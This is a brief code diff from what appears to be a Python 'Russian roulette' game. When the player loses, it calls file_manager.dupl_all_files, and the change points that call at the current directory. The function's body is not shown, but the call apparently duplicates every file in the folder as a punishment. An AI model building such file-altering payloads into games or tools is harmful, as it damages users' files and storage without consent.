@@ -61,7 +61,7 @@ def main():
             start = rotate_pistol(100, 100, start)
             if start == 0:
                 end_text = "You lose!"
-                file_manager.dupl_all_files()
+                file_manager.dupl_all_files('.')
             else:
                 end_text = "Lucky you!"
 
